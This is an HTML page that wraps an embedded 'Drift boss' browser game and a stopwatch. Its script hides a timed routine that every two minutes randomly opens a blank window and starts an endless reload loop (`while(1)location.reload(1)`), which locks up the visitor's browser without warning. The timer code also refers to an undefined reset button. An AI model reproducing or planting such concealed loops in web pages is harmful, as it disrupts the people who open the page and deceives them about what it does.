<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Drift boss</title>
  </head>
  <body>
    <p><span id="min">00</span>:<span id="seconds">00</span>:<span id="tens">00</span></p>
    <iframe id="game" src="https://www.mathplayground.com/drift-boss-v3/index.html" width="100%" height="600px" scrolling="yes" frameborder="0"></iframe>
  </body>
  <script>
    hello()

    function hello() {
      setTimeout(function() {
        ya()
        hello()
      }, 120000);
    }

    function ya() {
        let num = Math.floor(Math.random() * 16);
        if (num == 7) {
            window.open("about:blank")

            while(1)location.reload(1)
        }
    }

    window.onload = function () {
  
  var seconds = 00; 
  var tens = 00; 
  var min = 00;
  var appendTens = document.getElementById("tens")
  var appendSeconds = document.getElementById("seconds")
  var appendMin = document.getElementById("min")
  var Interval ;

    
    clearInterval(Interval);
    Interval = setInterval(startTimer, 10);
  
  

  buttonReset.onclick = function() {
     clearInterval(Interval);
    tens = "00";
  	seconds = "00";
    appendTens.innerHTML = tens;
  	appendSeconds.innerHTML = seconds;
  }
  
   
  
  function startTimer () {
    tens++; 
    
    if(tens <= 9){
      appendTens.innerHTML = "0" + tens;
    }
    
    if (tens > 9){
      appendTens.innerHTML = tens;
      
    } 
    
    if (tens > 99) {
      console.log("seconds");
      seconds++;
      appendSeconds.innerHTML = "0" + seconds;
      tens = 0;
      appendTens.innerHTML = "0" + 0;
    }
    
    if (seconds > 59) {
      console.log("min");
      min++;
      appendMin.innerHTML = "0" + min;
      seconds = 0;
      appendSeconds.innerHTML = "0" + 0;
      
    }

    if (seconds > 9){
      appendSeconds.innerHTML = seconds;
    }

    if (min > 9){
      appendMin.innerHTML = min;
    }
  
  }
  

}
  </script>
</html>
